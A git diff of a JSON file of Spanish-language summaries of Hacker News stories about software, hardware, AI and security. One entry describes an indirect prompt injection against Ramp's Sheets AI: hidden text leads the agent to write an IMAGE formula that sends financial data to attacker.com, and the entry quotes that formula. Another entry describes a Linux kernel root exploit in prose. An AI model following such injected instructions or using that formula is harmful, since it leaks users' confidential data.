@@ -1,335 +1,308 @@
 [
   {
+    "id": 47949027,
+    "url": "https://zed.dev/blog/zed-1-0",
+    "score": 1865,
+    "time": 1777473259,
+    "titulo_es": "Lanzamiento de Zed 1.0: Reinventando el editor de código con alto rendimiento y arquitectura nativa de IA",
+    "resumen": "El artículo anuncia la versión 1.0 de Zed, un editor de código desarrollado en Rust que rompe con el paradigma de Electron para utilizar un motor de renderizado basado en GPU (GPUI). El arquitecto Nathan Sobo detalla la transición técnica desde Atom hacia un sistema de alto rendimiento que integra IA de forma nativa mediante el Agent Client Protocol. Además, se introduce DeltaDB, un motor de sincronización basado en CRDTs diseñado para permitir la colaboración en tiempo real entre desarrolladores humanos y agentes de IA con granularidad a nivel de caracteres.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47957294,
+    "url": "https://simonwillison.net/2026/Apr/30/zig-anti-ai/",
+    "score": 298,
+    "time": 1777515347,
+    "titulo_es": "Zig y su estricta política contra las contribuciones generadas por IA",
+    "resumen": "El proyecto de código abierto Zig mantiene una política de tolerancia cero hacia el uso de modelos de lenguaje (LLM) en sus contribuciones, incluyendo pull requests y documentación. La Zig Software Foundation fundamenta esta decisión en el concepto de 'contributor poker', argumentando que el valor fundamental de un proyecto reside en cultivar y confiar en los colaboradores humanos a largo plazo, no simplemente en el código aportado. Esta postura ha generado una divergencia con proyectos como el runtime Bun, que tras ser adquirido por Anthropic e integrar mejoras mediante IA, se ve imposibilitado para enviar sus optimizaciones de rendimiento al repositorio principal de Zig.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47959463,
+    "url": "https://github.com/mozilla/standards-positions/issues/1213",
+    "score": 82,
+    "time": 1777535035,
+    "titulo_es": "Inicio de prototipado para la API de Prompts en el motor Blink",
+    "resumen": "Blink ha publicado una intención de prototipo para la 'Prompt API', una iniciativa dentro del grupo de Web Machine Learning para exponer capacidades de modelos de lenguaje de gran tamaño (LLMs) de forma nativa en el navegador. Esta API permitirá a los desarrolladores web interactuar con modelos de IA generativa locales, estandarizando la forma en que se envían instrucciones y se reciben respuestas directamente en el cliente.",
+    "categoria": "IA"
+  },
+  {
+    "id": 47952181,
+    "url": "https://copy.fail/",
+    "score": 991,
+    "time": 1777486433,
+    "titulo_es": "Copy Fail: Una vulnerabilidad lógica de escalada de privilegios locales en el kernel de Linux",
+    "resumen": "Análisis técnico de CVE-2026-31431, apodado 'Copy Fail', un fallo de lógica crítica en el subsistema de criptografía del kernel de Linux (AF_ALG) que permite a un usuario local sin privilegios obtener acceso de root de forma determinista. A diferencia de otros exploits, no requiere condiciones de carrera (race conditions) ni offsets específicos del kernel, afectando a casi todas las distribuciones de Linux desde 2017. La vulnerabilidad permite escrituras de 4 bytes en la caché de páginas, lo que compromete la integridad del sistema. El hallazgo fue realizado mediante Xint Code, una herramienta de auditoría basada en IA.",
+    "categoria": "Ciberseguridad"
+  },
+  {
+    "id": 47923429,
+    "url": "https://derekrodriguez.dev/parse-dont-validate-through-the-years-with-c-/",
+    "score": 21,
+    "time": 1777306114,
+    "titulo_es": "Parsear, no validar: Aplicando el diseño orientado a tipos en C++",
+    "resumen": "El artículo explora el paradigma 'Parse, don't validate' de Alexis King, enfocándose en su aplicación práctica en C++ a través de diversas versiones (C++98 hasta C++23). El autor propone utilizar el sistema de tipos del lenguaje para convertir datos no estructurados en tipos internos que garanticen la validez del estado por construcción. Al centralizar la lógica de validación en el proceso de parseo, se eliminan las comprobaciones redundantes en la lógica de negocio y se previene la propagación de datos inconsistentes, mejorando la robustez y mantenibilidad del software.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47957714,
+    "url": "https://burrito.bio/essays/biology-is-a-burrito",
+    "score": 102,
+    "time": 1777519481,
+    "titulo_es": "Una visión de la célula",
+    "resumen": "El artículo analiza la complejidad física y matemática de las células biológicas, específicamente de la bacteria E. coli. Desmitifica la imagen de la célula como un espacio armonioso y espacioso, describiéndola como un entorno extremadamente congestionado y dinámico. El autor resalta cómo el uso de la biofísica y las matemáticas permite modelar y comprender procesos como la replicación del ADN y la síntesis de proteínas en condiciones de alta densidad molecular, transformando la biología de una disciplina puramente descriptiva a una ciencia cuantitativa rigurosa.",
+    "categoria": "Ciencia y Matematica"
+  },
+  {
+    "id": 47957627,
+    "url": "https://github.com/cauchy221/Alignment-Whack-a-Mole-Code",
+    "score": 137,
+    "time": 1777518711,
+    "titulo_es": "El topo de la alineación: El ajuste fino activa el recuerdo literal de libros con derechos de autor en modelos de lenguaje de gran tamaño",
+    "resumen": "Repositorio oficial del estudio 'Alignment Whack-a-Mole', que analiza cómo el proceso de ajuste fino (finetuning) en modelos de lenguaje de gran tamaño (LLM) puede reactivar la capacidad de generar texto verbatim de obras protegidas por derechos de autor. El sistema proporciona un pipeline completo de preprocesamiento de datos, scripts de entrenamiento para modelos de OpenAI, Google Gemini (Vertex AI) y DeepSeek, así como herramientas para evaluar métricas de memorización y similitud de Jaccard en los resultados generados.",
+    "categoria": "IA"
+  },
+  {
+    "id": 47929354,
+    "url": "https://newsletter.semianalysis.com/p/mi300x-vs-h100-vs-h200-benchmark-part-1-training",
+    "score": 13,
+    "time": 1777338683,
+    "titulo_es": "La Realidad del AMD MI300X: Análisis de Rendimiento y TCO frente a Nvidia H100 y H200",
+    "resumen": "Análisis técnico de cinco meses realizado por SemiAnalysis sobre la GPU AMD MI300X en comparación con las soluciones de Nvidia. El informe concluye que, a pesar de tener especificaciones técnicas y un TCO teóricamente superiores, el hardware de AMD se ve gravemente lastrado por un ecosistema de software inmaduro y una cultura de QA deficiente. Las pruebas de entrenamiento (benchmarks GEMM y nodos individuales) revelaron errores críticos que impiden el uso directo del dispositivo, permitiendo que Nvidia mantenga su ventaja competitiva a través de la robustez de CUDA y optimizaciones continuas de software.",
+    "categoria": "Hardware"
+  },
+  {
+    "id": 47950510,
+    "url": "https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies",
+    "score": 343,
+    "time": 1777479399,
+    "titulo_es": "El proxy inverso HTTP es un campo minado: por qué FastCGI es una alternativa más segura",
+    "resumen": "El artículo expone los riesgos de seguridad inherentes al uso de HTTP/1.1 para la comunicación entre proxies inversos y backends, centrándose en las vulnerabilidades de desincronización (request smuggling). Debido a la ambigüedad en el parseo de mensajes y la falta de un enmarcado (framing) robusto en HTTP/1.1, los atacantes pueden manipular los límites de las peticiones. Como solución técnica, se propone el protocolo FastCGI, el cual utiliza un enmarcado binario explícito desde 1996, eliminando el riesgo de desincronización y ofreciendo un método más confiable para transmitir metadatos (como la IP real del cliente) sin depender de cabeceras HTTP fácilmente manipulables.",
+    "categoria": "Ciberseguridad"
+  },
+  {
+    "id": 47958106,
+    "url": "https://wiki.haskell.org/Monad_tutorials_timeline",
+    "score": 38,
+    "time": 1777523287,
+    "titulo_es": "Cronología exhaustiva de tutoriales sobre mónadas",
+    "resumen": "El texto describe una recopilación colaborativa de recursos educativos sobre mónadas, diseñada para actualizarse continuamente por la comunidad. Incluye una definición técnica rigurosa basada en la teoría de categorías, describiendo a la mónada como un monoide en la categoría de endofuntores, y sirve como guía de referencia para comprender este patrón fundamental en la programación funcional.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47956739,
+    "url": "https://mikeoss.com/",
+    "score": 98,
+    "time": 1777510583,
+    "titulo_es": "Análisis de documentos y automatización de contratos mediante IA sin contratos corporativos",
+    "resumen": "Plataforma avanzada de procesamiento de lenguaje natural que permite la gestión de documentos legales y flujos de trabajo complejos. El sistema destaca por su capacidad de extracción de datos masiva con citas verificables, eliminación de alucinaciones y soporte para modelos externos como Claude o Gemini, permitiendo el despliegue tanto en la nube como de forma local (self-hosted).",
+    "categoria": "IA"
+  },
+  {
+    "id": 47952722,
+    "url": "https://github.com/anthropics/claude-code/issues/53262",
+    "score": 1134,
+    "time": 1777488871,
+    "titulo_es": "Anomalía de facturación en Claude Code activada por cadenas de texto en commits de Git",
+    "resumen": "Se ha identificado un comportamiento crítico en Claude Code donde la presencia de la cadena 'HERMES.md' dentro de los mensajes de commit de un repositorio Git provoca que el sistema redirija las solicitudes de API a la facturación de 'uso extra' (créditos pagados) en lugar de consumir la cuota incluida en el plan Max. El problema técnico se origina en el procesamiento del prompt del sistema en el lado del servidor, que al incluir el historial de commits reciente, activa inadvertidamente una regla de enrutamiento de costes distinta, independientemente de si el archivo existe físicamente en el disco.",
+    "categoria": "IA"
+  },
+  {
+    "id": 47959513,
+    "url": "https://datacenter.fm/",
+    "score": 14,
+    "time": 1777535532,
+    "titulo_es": "Experimenta los sonidos del mundo real de la IA con este generador de audio interactivo",
+    "resumen": "Se trata de una herramienta interactiva diseñada para simular los entornos auditivos de la infraestructura física que sustenta la inteligencia artificial. El generador permite a los usuarios experimentar los sonidos operativos y de alerta de los centros de datos a gran escala, incluyendo estados críticos como advertencias de calor, drenaje de agua local y brechas de contención, proporcionando una perspectiva sensorial sobre el hardware y el mantenimiento de sistemas de IA.",
+    "categoria": "IA"
+  },
+  {
+    "id": 47951137,
+    "url": "https://lawsofux.com/",
+    "score": 273,
+    "time": 1777481893,
+    "titulo_es": "Leyes de UX",
+    "resumen": "El artículo es una recopilación de principios psicológicos y mejores prácticas aplicadas al diseño de interfaces de usuario (UI). Explora conceptos clave como la carga cognitiva, la Ley de Hick, el efecto de estética-usabilidad y la Ley de Miller, proporcionando directrices sobre cómo la percepción humana y los modelos mentales influyen en la interacción con sistemas digitales.",
+    "categoria": "Frontend"
+  },
+  {
+    "id": 47949204,
+    "url": "https://github.com/GliaX/Stethoscope",
+    "score": 256,
+    "time": 1777474051,
+    "titulo_es": "Estetoscopio de Código Abierto Validado por Investigación Médica",
+    "resumen": "Este proyecto describe la creación y validación técnica de un estetoscopio impreso en 3D con un costo de producción de entre $2.5 y $5 USD, diseñado para igualar el rendimiento acústico del estándar Littmann Cardiology III. Se detallan especificaciones críticas de hardware, como el requisito de un relleno (infill) del 100% para la transmisión correcta del sonido, el uso de tubos de silicona específicos, diafragmas de plástico y la exclusión de material PLA por su baja resistencia térmica. El diseño se gestiona mediante CrystalSCAD y OpenSCAD, bajo una licencia de hardware abierto TAPR OHL.",
+    "categoria": "Hardware"
+  },
+  {
+    "id": 47957624,
+    "url": "https://pure-systems.org/posts/2026-04-29-functional-programmers-need-to-take-a-look-at-zig.html",
+    "score": 124,
+    "time": 1777518693,
+    "titulo_es": "Explorando Zig: Comptime, Mónadas y el Fin de la Era de la Recolección de Basura",
+    "resumen": "El artículo analiza el lenguaje de programación Zig, destacando su sistema 'comptime' como una alternativa flexible para la programación de sistemas de tipos. El autor critica la dependencia de la industria en la recolección de basura (GC), argumentando que los lenguajes modernos no han evolucionado a la par del hardware actual, donde la brecha entre la velocidad de la CPU y la latencia de memoria penaliza el uso excesivo de punteros al heap. Propone un retorno a lenguajes que permitan un control más fino sobre la máquina y discute la falta de incentivos para la innovación en el diseño de lenguajes de programación.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47945707,
+    "url": "https://jointhefreeworld.org/blog/articles/lisps/why-i-still-reach-for-scheme-instead-of-haskell/index.html",
+    "score": 229,
+    "time": 1777452197,
+    "titulo_es": "Haskell vs Scheme: La tensión entre la pureza funcional y el pragmatismo en el desarrollo de software",
+    "resumen": "Reflexión técnica sobre el equilibrio entre la rigidez matemática de Haskell y la flexibilidad de Scheme/Lisp. El autor examina cómo, a pesar de la elegancia de los sistemas de tipos avanzados y la teoría de categorías, la complejidad inherente de Haskell puede obstaculizar el prototipado rápido y la resolución de tareas prácticas de entrada/salida (I/O). En contraste, se destaca a Scheme como una alternativa funcional más humana y eficiente para el hacking ágil, permitiendo una expresión simple de dominios complejos sin la fricción de una arquitectura excesivamente formal desde el inicio.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47936610,
+    "url": "https://amandahinton.com/blog/creating-a-color-palette-from-an-image",
+    "score": 75,
+    "time": 1777393430,
+    "titulo_es": "Cómo extraer los colores más representativos de una fotografía: La evolución de Spectrimage",
+    "resumen": "El artículo describe el proceso de diseño de un algoritmo para la extracción de paletas de colores significativas a partir de imágenes. El autor detalla la transición de un sistema de reglas manuales complejo en espacios RGB/HSL hacia una implementación más elegante basada en el algoritmo de agrupamiento K-means++ utilizando el espacio de color OKLCH. Se abordan desafíos técnicos como la selección determinista de semillas, la gestión de umbrales de croma para evitar colores apagados, y la optimización del parámetro K (fijado en 14) para equilibrar la detección de acentos cromáticos pequeños con la cohesión de la paleta final.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47956781,
+    "url": "https://www.flyingmag.com/joby-nyc-electric-air-taxi-jfk-airport/",
+    "score": 50,
+    "time": 1777510915,
+    "titulo_es": "Taxis aéreos eléctricos de Joby Aviation realizan sus primeros vuelos de prueba en Nueva York",
+    "resumen": "Joby Aviation ha completado con éxito los primeros vuelos de prueba de su prototipo de taxi aéreo eléctrico (eVTOL) conectando el aeropuerto JFK con Manhattan. La aeronave destaca por su arquitectura de hardware avanzada que incluye seis hélices basculantes para despegue vertical y vuelo de crucero, controles fly-by-wire y un sistema de propulsión eléctrica diseñado para operar con redundancia incluso ante el fallo de motores. Este hito forma parte de un programa de la FAA para integrar estos vehículos y su infraestructura de carga (vertipuertos) en el sistema aeroespacial.",
+    "categoria": "Hardware"
+  },
+  {
+    "id": 47930003,
+    "url": "https://devblogs.microsoft.com/oldnewthing/20260427-00/?p=112271",
+    "score": 62,
+    "time": 1777344949,
+    "titulo_es": "Convenciones de llamada y el comportamiento indefinido en C/C++",
+    "resumen": "El artículo explora las convenciones de llamada de funciones en procesadores (con un enfoque en Windows y el procesador Itanium) y las implicaciones de llamar a funciones con un número incorrecto de parámetros. Explica que, aunque una función pueda ignorar un parámetro, el lenguaje C/C++ define este comportamiento como indefinido. Se detallan los riesgos potenciales: desbordamiento de pila en convenciones \"callee-clean\", corrupción de memoria por reutilización de espacio de parámetros como \"scratch space\" (incluso si el compilador optimiza la asignación de memoria), y la lectura de valores no inicializados en registros. Se destaca un caso particular del procesador Itanium con el bit \"Not a Thing\" (NaT), que puede causar excepciones y bloqueos incluso si el parámetro no se usa explícitamente, debido a la gestión de la validez de los registros y el mecanismo de llamada arquitectónico de funciones \"leaf\".",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47948603,
+    "url": "https://blog.tangled.org/federation/",
+    "score": 573,
+    "time": 1777471259,
+    "titulo_es": "Git es descentralizado, ¿pero qué pasa con el resto? Tangled: Colaboración federada para código abierto",
+    "resumen": "El artículo discute la creciente dependencia del software de código abierto (OSS) de proveedores centralizados como GitHub, señalando que los sistemas centralizados son propensos a fallar. Presenta Tangled como una solución que aprovecha la naturaleza descentralizada de Git para la colaboración. Tangled introduce un modelo federado donde los repositorios de Git se alojan en \"nodos\" (servidores) independientes, permitiendo la colaboración y bifurcación entre diferentes servidores. Utiliza un protocolo llamado AT (Authenticated Transfer) para facilitar la transferencia autenticada de eventos relacionados con el código, como problemas (issues) y solicitudes de extracción (pull-requests), así como características sociales como líneas de tiempo, seguidores y \"estrellas\" (likes). AT también se usa para compartir invitaciones de colaboradores y claves SSH públicas. El objetivo es ofrecer una alternativa descentralizada y federada a las plataformas de colaboración centralizadas, manteniendo la diversión y la interacción social en el desarrollo de OSS.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47954638,
+    "url": "https://lina.sh/blog/ddos-honeypot",
+    "score": 118,
+    "time": 1777496678,
+    "titulo_es": "Cómo me topé con un sitio falso de booter dirigido por la policía internacional, y cómo entraron en pánico cuando empecé a investigar",
+    "resumen": "El artículo detalla el descubrimiento de sitios web falsos (booters) operados por la policía holandesa como parte de la 'Operación PowerOFF', un esfuerzo internacional contra servicios de DDoS. El autor encontró 'cyberzap.fun', un sitio que simulaba ser un servicio de DDoS pero que, tras registrarse con un correo específico y simular un ataque, mostraba errores de pago y registraba al usuario. Este sitio estaba configurado para atraer a ciberdelincuentes y recopilar evidencia. Paralelamente, se menciona 'netcrashers.net', un sitio más simple diseñado para asustar a los jóvenes. El autor relata que, tras investigar 'cyberzap.fun', el sitio fue repentinamente desactivado con un mensaje de acceso no autorizado, sugiriendo que la policía se dio cuenta de la investigación y entró en pánico. Se distingue entre el sitio trampa 'cyberzap.fun' que fue desactivado y el sitio de advertencia 'netcrashers.net' que permaneció online. El artículo resalta la táctica policial de crear sitios señuelo para identificar y recopilar información sobre actores maliciosos.",
+    "categoria": "Ciberseguridad"
+  },
+  {
     "id": 47939579,
     "url": "https://mitchellh.com/writing/ghostty-leaving-github",
-    "score": 2641,
+    "score": 3404,
     "time": 1777405492,
-    "titulo_es": "Ghostty abandona GitHub",
-    "resumen": "Mitchell Hashimoto, creador de Vagrant y del emulador de terminal Ghostty, anuncia la salida del proyecto de la plataforma GitHub. La decisión técnica se fundamenta en la creciente falta de fiabilidad e inestabilidad del servicio, específicamente citando interrupciones frecuentes en GitHub Actions que bloquean los flujos de trabajo de integración continua (CI) y revisión de código. El autor detalla un plan de migración incremental hacia nuevos proveedores (tanto comerciales como de software libre) debido a que la infraestructura actual de GitHub ya no cumple con los estándares necesarios para el trabajo de desarrollo profesional sostenido.",
+    "titulo_es": "Ghostty abandona GitHub tras 18 años debido a problemas de fiabilidad",
+    "resumen": "El autor, un usuario de GitHub desde 2008, anuncia la migración del proyecto Ghostty fuera de la plataforma debido a problemas recurrentes y graves de fiabilidad, incluyendo frecuentes interrupciones de GitHub Actions que impactan negativamente su capacidad de trabajo diario. A pesar de su larga y apasionada relación con GitHub, que incluso motivó el inicio de su proyecto Vagrant con la esperanza de trabajar allí, las continuas indisponibilidades han hecho que la plataforma ya no sea adecuada para el desarrollo serio. El autor expresa su decepción personal y la de la comunidad, y aunque mantendrá un mirror de solo lectura en GitHub, el proyecto principal y sus dependencias se migrarán a otros proveedores (comerciales y FOSS) tras un plan incremental. La decisión, aunque coincidente con una gran outage, se ha gestado durante meses.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47951786,
+    "url": "https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials",
+    "score": 130,
+    "time": 1777484661,
+    "titulo_es": "Vulnerabilidad en Ramp's Sheets AI permite la exfiltración de datos a través de inyección indirecta de prompts",
+    "resumen": "Se descubrió una vulnerabilidad en Ramp's Sheets AI que permitía a un agente insertar fórmulas capaces de realizar solicitudes de red externas sin la aprobación del usuario. Un atacante podría ocultar una inyección de prompt indirecta en un conjunto de datos externo no confiable (por ejemplo, texto oculto en blanco sobre blanco) para manipular la IA de Ramp. Esto provocaría que la IA generara y aplicara una fórmula maliciosa, como una fórmula IMAGE, que incluya datos financieros confidenciales del usuario y los envíe a un servidor controlado por el atacante. La vulnerabilidad se demostró mediante la creación de una fórmula `=IMAGE(“https://attacker.com/visualize.png?{victim_sensitive_financial_data_here}”)`, que, al ejecutarse, enviaba los datos sensibles al servidor del atacante. Ramp's security team indicó que el problema se resolvió el 16 de marzo de 2026. Un riesgo similar se identificó previamente en Claude for Excel, donde Anthropic implementó una advertencia roja para las fórmulas que activan tráfico de red externo.",
+    "categoria": "Ciberseguridad"
+  },
+  {
+    "id": 47955118,
+    "url": "https://github.com/aallan/vera",
+    "score": 92,
+    "time": 1777498892,
+    "titulo_es": "Vera: Un Lenguaje de Programación para Modelos de Lenguaje Grandes",
+    "resumen": "Vera es un lenguaje de programación diseñado específicamente para que los modelos de lenguaje grandes (LLMs) escriban código. A diferencia de los lenguajes tradicionales, Vera elimina los nombres de variables, reemplazándolos por referencias estructurales, y hace obligatorios los contratos (precondiciones y postcondiciones verificables estáticamente) y las declaraciones explícitas de efectos. El objetivo es abordar los problemas de coherencia y razonamiento de los LLMs en el manejo de código a gran escala, centrándose en la verificabilidad en lugar de la corrección intrínseca del modelo. Los programas Vera compilan a WebAssembly y pueden ejecutarse en la línea de comandos o en el navegador. El compilador proporciona diagnósticos detallados y estructurados en JSON para guiar a los modelos en la corrección de errores. Vera soporta características avanzadas como tipos de refinamiento, tipos de datos algebraicos y manejo de efectos como llamadas a LLMs o HTTP, asegurando que las dependencias y efectos secundarios sean explícitos y verificables.",
+    "categoria": "IA"
+  },
+  {
+    "id": 47958942,
+    "url": "https://scottaaronson.blog/?p=9718",
+    "score": 58,
+    "time": 1777530630,
+    "titulo_es": "El Futuro Cuántico de las Criptomonedas: Amenazas y Respuestas",
+    "resumen": "El artículo aborda la inminente amenaza que representan las computadoras cuánticas para la criptografía actual, especialmente para las criptomonedas. El autor, recientemente admitido en la Academia Nacional de Ciencias de EE. UU., menciona que expertos en hardware y corrección de errores cuánticos sugieren que una computadora cuántica tolerante a fallos, capaz de romper sistemas criptográficos desplegados, podría estar lista alrededor de 2029. A pesar de la incertidumbre sobre el cronograma exacto, la carrera por escalar estas computadoras no se detendrá. El autor argumenta que es preferible que esta tecnología sea desarrollada por empresas en el ámbito público en lugar de por actores maliciosos en secreto. Señala que las advertencias sobre la amenaza cuántica a la criptografía (RSA, Diffie-Hellman, curvas elípticas) han existido durante años, pero muchos en ciberseguridad aún están en negación. Compara la situación con el reciente impacto de los modelos de IA en la ciberseguridad, sugiriendo que la urgencia de abordar la amenaza cuántica es similar y que es mejor enfrentar el problema lo antes posible.",
+    "categoria": "Ciberseguridad"
+  },
+  {
+    "id": 47921802,
+    "url": "https://bensimms.moe/postgres-lateral-makes-quite-a-good-dsl/",
+    "score": 84,
+    "time": 1777298845,
+    "titulo_es": "Uniones Laterales: Una Herramienta para la Composición de Consultas y la Construcción de DSLs",
+    "resumen": "El artículo explora el uso de las uniones laterales (LATERAL JOIN) en bases de datos como PostgreSQL para resolver problemas de composición de consultas que a menudo enfrentan los ORMs y constructores de consultas tradicionales. Las uniones laterales permiten que las subconsultas dentro de una cláusula FROM hagan referencia a columnas de cláusulas FROM anteriores, lo que facilita la construcción de consultas complejas y componibles de una manera más directa y expresiva. Se discuten las limitaciones de las técnicas de composición actuales, como la dificultad de composición en lenguajes tipados con ORMs y la rigidez de los enfoques de generación de enlaces SQL. Se presenta la biblioteca Haskell Rel8 como un ejemplo de cómo las uniones laterales pueden ser utilizadas para crear un DSL (Domain Specific Language) de consulta altamente expresivo, donde la manipulación de datos en el lenguaje anfitrión se asemeja a la construcción de la consulta SQL subyacente, aprovechando el sistema de tipos y el contexto del monad Query para garantizar la validez de las expresiones.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47946813,
+    "url": "https://github.com/DOS-History/Paterson-Listings",
+    "score": 142,
+    "time": 1777461912,
+    "titulo_es": "Listados de DOS de Tim Paterson",
+    "resumen": "El artículo describe la digitalización y transcripción de los listados de código fuente originales del kernel de 86-DOS 1.00, varios kernels de PC-DOS 1.00 pre-release y utilidades, y la biblioteca de tiempo de ejecución del compilador Microsoft BASIC-86. Los listados, que consisten en 10 haces de papel continuo, han sido parcialmente transcritos a código fuente compilable. Se proporcionan instrucciones para acceder y compilar el código fuente, incluyendo la necesidad de los ensambladores ASM y la utilidad HEX2BIN de Seattle Computer Products. Las exploraciones originales en PDF y PNG están disponibles en archive.org. Se solicita ayuda para transcribir los paquetes restantes. El contenido se centra en la preservación y accesibilidad del código fuente histórico de DOS.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47951037,
+    "url": "https://eclecticlight.co/2026/04/29/virtualisation-on-apple-silicon-macs-is-different/",
+    "score": 95,
+    "time": 1777481498,
+    "titulo_es": "Virtualización en Macs con Apple Silicon: Un Enfoque Basado en Virtio",
+    "resumen": "El artículo detalla cómo Apple ha abordado la virtualización en sus Macs con Apple Silicon, un cambio fundamental respecto a la arquitectura Intel. A diferencia de los sistemas Intel que se basaban en componentes de hardware de PC y permitían a terceros como VMware y Parallels implementar soluciones de virtualización, los chips de Apple Silicon utilizan hardware propietario. Para soportar la virtualización, Apple ha integrado un hipervisor en macOS (desde OS X 10.10) y ha desarrollado soporte para dispositivos virtuales a través de Virtio. Virtio es un estándar que proporciona una capa de abstracción para dispositivos de E/S, permitiendo que el sistema operativo anfitrión (macOS) y el sistema operativo invitado (como Linux o Windows para ARM) se comuniquen de manera eficiente. La implementación de Virtio en macOS, que comenzó antes de Monterey, permite que características como el soporte de gráficos de alto rendimiento (Metal y GPU), portapapeles compartido y dispositivos de entrada sean gestionadas por el sistema operativo anfitrión y el invitado a través de drivers Virtio. Esto difiere de la virtualización tradicional donde el software de virtualización (como VMware) se encarga de gran parte de la emulación de hardware. Al incorporar el soporte de dispositivos directamente en macOS mediante Virtio, Apple garantiza un rendimiento óptimo y mantiene el control sobre las características soportadas en la virtualización de Apple Silicon, reduciendo la dependencia y el coste de desarrollo para terceros.",
+    "categoria": "Hardware"
+  },
+  {
+    "id": 47960263,
+    "url": "https://lemire.me/blog/2026/04/27/you-can-beat-the-binary-search/",
+    "score": 3,
+    "time": 1777542975,
+    "titulo_es": "Algoritmo de Búsqueda SIMD Quad para Arrays Ordenados de 16 Bits",
+    "resumen": "El artículo presenta el algoritmo SIMD Quad, una nueva técnica de búsqueda eficiente para arrays ordenados de enteros sin signo de 16 bits. Este algoritmo combina la búsqueda por interpolación cuaternaria con instrucciones SIMD (Single Instruction, Multiple Data). Divide el array en bloques de 16 elementos y utiliza el último elemento de cada bloque como clave para la interpolación, reduciendo rápidamente el espacio de búsqueda a un solo bloque. Posteriormente, las instrucciones SIMD se utilizan para comparar simultáneamente los 16 elementos dentro de ese bloque. La estrategia es jerárquica: primero, una búsqueda por interpolación a nivel de bloque para localizar el bloque probable, y luego, un procesamiento paralelo con SIMD dentro del bloque. Las pruebas de rendimiento en sistemas Intel y Apple M4 demuestran que SIMD Quad supera significativamente a la búsqueda lineal (std::find) y a la búsqueda binaria (std::binary_search), especialmente en escenarios de caché cálida en Intel y caché fría en Apple, logrando mejoras de más del doble en ciertos casos.",
+    "categoria": "Desarrollo de Software"
+  },
+  {
+    "id": 47957484,
+    "url": "https://warmburnout.com/",
+    "score": 13,
+    "time": 1777517490,
+    "titulo_es": "Warm Burnout: Una suite de temas para desarrolladores con fatiga visual",
+    "resumen": "El artículo describe 'Warm Burnout', una suite de temas para entornos de desarrollo (IDEs y terminales) diseñada para reducir la fatiga visual de los desarrolladores. A diferencia de los temas tradicionales que utilizan colores en el espectro azul (450-500nm), conocidos por suprimir la melatonina y causar fatiga digital, Warm Burnout emplea una paleta de colores cálidos (dominante 550-630nm). La suite se enfoca en la accesibilidad y el confort visual, asegurando que todos los tokens cumplan con los estándares de contraste WCAG AAA (>= 7:1) en la variante oscura y WCAG AA (>= 4.5:1) en la variante clara. Se detallan los colores específicos para diferentes elementos de sintaxis y se menciona la inspiración en materiales que envejecen bien. La suite es compatible con una amplia gama de editores (VS Code, JetBrains IDEs, Zed, Neovim, Xcode), terminales (Ghostty, iTerm2, Windows Terminal, Warp), multiplexores (tmux, Zellij) y otras herramientas como Starship, Home Assistant y Obsidian. Se destaca la auditabilidad completa de contraste contra los estándares WCAG.",
     "categoria": "Desarrollo de Software"
   },
   {
     "id": 47945918,
     "url": "https://www.nldigitalgovernment.nl/news/soft-launch-for-government-open-source-code-platform/",
-    "score": 43,
+    "score": 541,
     "time": 1777454077,
-    "titulo_es": "Lanzamiento de code.overheid.nl: La plataforma de código abierto para el gobierno neerlandés",
-    "resumen": "El gobierno de los Países Bajos ha puesto en marcha code.overheid.nl, una plataforma centralizada para el desarrollo y publicación de software de código abierto. Este ecosistema, basado en Forgejo, busca garantizar la soberanía digital mediante una infraestructura autogestionada que sirve como alternativa europea a servicios como GitHub o GitLab. Actualmente en fase piloto, el proyecto es liderado por la Oficina de Programas de Código Abierto del Ministerio del Interior y Relaciones del Reino para fomentar la colaboración técnica entre organismos públicos.",
+    "titulo_es": "Plataforma de Código de Gobierno Holandés Ahora en Línea",
+    "resumen": "El artículo describe el lanzamiento de code.overheid.nl, una plataforma nacional holandesa para el desarrollo y publicación de software de código abierto. Esta plataforma, autoalojada y utilizando Forgejo como alternativa soberana a GitHub/GitLab, está diseñada para fomentar la soberanía digital y eventualmente servir como una plataforma Git compartida para organismos gubernamentales. Iniciada por la Oficina del Programa de Código Abierto del Ministerio del Interior y Relaciones del Reino, la plataforma está actualmente en fase piloto, invitando a desarrolladores a contribuir.",
     "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47943499,
-    "url": "https://corrode.dev/blog/bugs-rust-wont-catch/",
-    "score": 309,
-    "time": 1777429151,
-    "titulo_es": "Vulnerabilidades en uutils de Rust: Lecciones de seguridad en sistemas para arquitectos",
-    "resumen": "El artículo analiza un conjunto de 44 vulnerabilidades (CVEs) descubiertas en uutils, la reimplementación en Rust de las coreutils de GNU. A pesar de las garantías de memoria de Rust, el análisis revela fallos lógicos críticos de tipo TOCTOU (Time Of Check To Time Of Use) y ataques de enlaces simbólicos en herramientas privilegiadas. Se detalla cómo las APIs ergonómicas de la biblioteca estándar de Rust pueden inducir a errores al operar sobre rutas en lugar de descriptores de archivos. Además, se abordan problemas de condiciones de carrera en la asignación de permisos y métodos para evadir protecciones de directorio raíz, enfatizando la importancia de la canonicalización y las operaciones atómicas en la programación de sistemas segura.",
-    "categoria": "Ciberseguridad"
-  },
-  {
-    "id": 47944864,
-    "url": "https://hardenedbsd.org/article/shawn-webb/2026-04-26/hardenedbsd-officially-radicle",
-    "score": 71,
-    "time": 1777444724,
-    "titulo_es": "Migración de los repositorios de HardenedBSD a Radicle",
